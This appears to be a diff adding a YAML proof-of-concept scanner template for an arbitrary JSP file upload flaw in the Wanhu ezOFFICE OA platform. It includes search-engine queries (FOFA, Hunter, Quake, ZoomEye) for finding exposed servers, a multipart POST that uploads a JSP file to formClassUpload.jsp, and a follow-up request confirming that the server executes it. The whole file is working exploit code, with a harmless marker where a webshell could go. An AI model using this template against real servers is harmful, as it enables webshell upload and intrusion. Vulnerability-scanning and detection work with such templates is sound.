@@ -1,0 +1,48 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: /defaultroot/devform/customize/4ndex.jsp  | 绝对路径   D:/ezoffice/webapps/defaultroot/devform/customize/4ndex.jsp
+    
+name: poc-yaml-wanhu-ezoffice-formClassUpload.jsp-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(10000000, 90000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /defaultroot/customize/formClassUpload.jsp?flag=1&returnField=null
+            headers:
+                Content-Type: multipart/form-data; boundary=---------------------------1665743219571139381{{s1}}           
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+                Accept-Encoding: gzip, deflate
+                Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+            body: "-----------------------------1665743219571139381{{s1}}\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"4ndex.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"4ra1n\");%>\r\n-----------------------------1665743219571139381{{s1}}\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n上传\r\n-----------------------------1665743219571139381{{s1}}--\r\n"            
+        expression: response.status == 200 && response.body_string.contains("4ndex.jsp")
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/devform/customize/4ndex.jsp
+            headers:
+            body:
+        expression: response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0() && r1() 
